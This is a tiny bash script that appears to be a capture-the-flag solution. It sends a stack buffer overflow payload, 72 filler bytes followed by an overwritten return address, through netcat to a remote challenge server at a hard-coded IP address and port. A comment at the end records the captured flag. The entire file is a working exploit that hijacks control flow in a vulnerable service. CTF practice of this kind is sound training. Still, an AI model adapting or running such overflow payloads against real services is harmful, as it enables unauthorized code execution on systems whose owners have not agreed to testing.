#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1

(
perl -e 'print("A" x 72, "\xb6\x11\x40\x00\n")'
sleep 1
) | nc 140.113.207.240 8834

echo

# FLAG{ZA_W4RUD0!!!!!!!!!!}
